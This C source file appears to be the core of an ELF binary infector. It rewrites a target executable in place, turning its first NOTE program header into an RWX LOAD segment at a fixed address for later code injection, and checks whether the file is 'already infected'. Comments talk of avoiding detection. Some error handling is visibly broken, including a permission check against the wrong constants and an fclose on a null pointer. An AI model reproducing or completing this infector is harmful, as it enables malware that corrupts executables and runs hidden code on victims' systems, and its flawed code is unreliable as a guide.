#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include "./vrn_elf.h"
#include "./elf_funcs.h"

#define EHDR_SIZE 64
unsigned long long VADDR = 0xc0c0c0c0;

/*
  Simple usage function
*/
void usage(char *program) {
  fprintf(stderr, "Usage: %s <elf file>\n", program);
}

/*
  Simple function to exit on error
*/
void exit_on_error(FILE *fp, char *err) {
  fprintf(stderr, "\033[0;31m[-] %s\n", err);
  fprintf(stderr, "\033[0;31m[-] Closing ELF file...\n\033[0m");
  fclose(fp);
  exit(1); 
}

/*
  Simple colorful logging function
*/
//TODO: Make it so this function can accept arguments
void log_msg(char *log) {
  fprintf(stdout, "\033[0;34m[+] %s\n\033[0m", log);
}

/*
  The Juice.
  This function *should* only be called once, even if there
  are multiple NOTE headers.

  This converts the NOTE to a LOAD, gives it RWX perms, and
  sets its virtual address to someplace we hopefully won't have
  any code, so we can jump to it without disrupting any other
  part of the binary.

  TODO: We probably just need R-X perms, so confirm this and then
  change it to avoid standing out.
*/
void note_to_load(FILE *fp, Elf64_Phdr *new_load) {
  unsigned int perms = 7; 
  unsigned int type = 1;

  // This is hackey, but... it works (?)
  fseek(fp, -56, SEEK_CUR);             // Go back to the beginning of the header we just parsed
  fwrite(&type, sizeof(type), 1, fp);   // Write the TYPE to the first 4 bytes of the header
  fwrite(&perms, sizeof(perms), 1, fp); // Write the FLAGS to the second 4 bytes of the header
  fseek(fp, 8, SEEK_CUR);               // Jump 8 bytes to skip the OFFSET flag (this is already good to go)
  fwrite(&VADDR, sizeof(VADDR), 1, fp); // Write 8 bytes to the VADDR (where we will jump)
  fseek(fp, -24, SEEK_CUR);

  parse_program_header(fp, new_load);
}

/*
  Parses the ELF we ingested from the command line.
*/
void parse_elf(FILE *fp) {
  // TODO: Create an "ELF" struct that stores the results of these functions
  struct Elf_File *elf_file;
  Elf64_Ehdr *ehdr;
  int note_count = 0;

  ehdr = malloc(sizeof(*ehdr));

  log_msg("Parsing ELF header...");
  parse_elf_header(fp, ehdr);

  unsigned short phdr_count = ehdr->e_phnum;
  Elf64_Phdr *phdr = malloc(phdr_count * sizeof(*phdr));
  Elf64_Phdr *new_load = malloc(sizeof(*new_load));;

  log_msg("Parsing program headers...");
  for (int i = 0; i < phdr_count; i++) {
    parse_program_header(fp, &phdr[i]);

    /*
      To avoid breaking the binary, we have to add a ridiculous check
      to confirm we haven't tainted this binary before.

      This check is problematic since the VADDR isn't guaranteed to *never*
      appear in a legit binary, but it's worked up til now, so /shrug
    */
    if (phdr[i].p_type == 1 && phdr[i].p_vaddr == VADDR) {
      log_msg("Found LOAD with our VADDR...");
      print_program_header(&phdr[i]);
      exit_on_error(fp, "Hmmm... Looks like we have already infected this binary...");
    }

    /*
      If we get here and we enter this if statement, we can pretty much
      guarantee we have no NOTE_TO_LOAD conversions yet.
    */
    if (phdr[i].p_type == 4 && note_count == 0) {
      note_count++;
      note_to_load(fp, new_load);
      log_msg("Converted NOTE:");
      print_program_header(&phdr[i]);
      log_msg("To LOAD:");
      print_program_header(new_load);
    }
  }

  // TODO: Make two functions. The convert and the print. Would be nice to have this be also an elf analysis tool.
  //log_msg("ELF Header");
  //print_elf_header(ehdr);
  //log_msg("Program Headers");
  //for (int i = 0; i < phdr_count; i++) {
  //  print_program_header(&phdr[i]);
  //}

  free(ehdr);
  free(phdr);
  free(new_load);

  return;
}

/*
  Function to check the permissions of the target binary.
  We must be able to read, write, and execute, or nothing else matters.
*/
int check_modes(struct stat stats) {
  // TODO: Figure out why write only works when the file is globally writeable
  if (stats.st_mode & R_OK && stats.st_mode & W_OK && stats.st_mode & X_OK) {
    return 1;
  }

  return 0;
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    usage(argv[0]);
    exit(1);
  }
  char *elf_file = argv[1];
  struct stat stats;
  FILE *fp;
  
  if (stat(elf_file, &stats) == 0) {
    log_msg("Opened file. Parsing ELF...\n");

    if (!check_modes(stats)) {
      fprintf(stderr, "[-] File must be readable, writeable, and executable. Exiting...");
      exit(1);
    }

    // Open file as byte readable
    fp = fopen(elf_file, "r+b");
    if (fp == NULL) {
      char *fp_err = "Could not open file: %s\n", elf_file;
      exit_on_error(fp, fp_err);
    }

    parse_elf(fp);
  }

  fclose(fp);
  log_msg("Closing target and exiting...");
  return 0;
}
